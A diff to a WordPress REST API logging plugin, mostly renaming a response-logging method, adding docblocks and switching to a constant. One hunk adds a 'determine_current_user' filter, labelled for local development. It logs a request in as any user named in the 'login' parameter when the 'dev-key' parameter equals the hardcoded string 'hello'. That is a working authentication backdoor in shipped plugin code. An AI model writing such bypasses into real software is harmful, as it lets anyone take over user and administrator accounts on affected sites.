@@ -7,10 +7,14 @@ if ( ! class_exists( 'WP_REST_API_Log' ) ) {
 	class WP_REST_API_Log {
 
 
+		/**
+		 * plugins_loaded WordPress hook
+		 * @return void
+		 */
 		public function plugins_loaded() {
 
 			// filter that is called by the REST API right before it sends a response
-			add_filter( 'rest_pre_serve_request', array( $this, 'rest_pre_serve_request' ), 9999, 4 );
+			add_filter( 'rest_pre_serve_request', array( $this, 'log_rest_api_response' ), 9999, 4 );
 
 			add_filter( 'wp-rest-api-log-bypass-insert', function( $bypass_insert, $result, $request, $rest_server ) {
 				// an example of disabling logging for specific requests
@@ -23,13 +27,42 @@ if ( ! class_exists( 'WP_REST_API_Log' ) ) {
 
 			}, 10, 4 );
 
+
+			// for local development
+			// remove this for deployment
+			add_filter( 'determine_current_user', function( $user_id ) {
+
+				if ( 'hello' == $_REQUEST['dev-key'] ) {
+					$user = get_user_by( 'login', $_REQUEST['login'] );
+					if ( ! empty( $user ) ){
+						$user_id = $user->ID;
+					}
+				}
+
+				return $user_id;
+
+			} );
+
 		}
 
 
-		public function rest_pre_serve_request( $served, $result, $request, $rest_server ) {
+		/**
+		 * Logs the REST API request & response right before it returns the data to the client
+		 *
+		 * @param  bool   $served        true if the response was served by something other than the REST API, otherwise false
+		 *
+		 * @param  object $result        response data
+		 *
+		 * @param  object $request       request data
+		 *
+		 * @param  object $rest_server   REST API server
+		 *
+		 * @return bool   $served
+		 */
+		public function log_rest_api_response( $served, $result, $request, $rest_server ) {
 
 			// allow specific requests to not be logged
-			$bypass_insert = apply_filters( WP_REST_API_Log_Common::$plugin_name . '-bypass-insert', false, $result, $request, $rest_server );
+			$bypass_insert = apply_filters( WP_REST_API_Log_Common::PLUGIN_NAME . '-bypass-insert', false, $result, $request, $rest_server );
 			if ( $bypass_insert ) {
 				return $served;
 			}
@@ -52,7 +85,7 @@ if ( ! class_exists( 'WP_REST_API_Log' ) ) {
 				);
 
 
-			do_action( WP_REST_API_Log_Common::$plugin_name . '-insert', $args );
+			do_action( WP_REST_API_Log_Common::PLUGIN_NAME . '-insert', $args );
 
 			return $served;
 
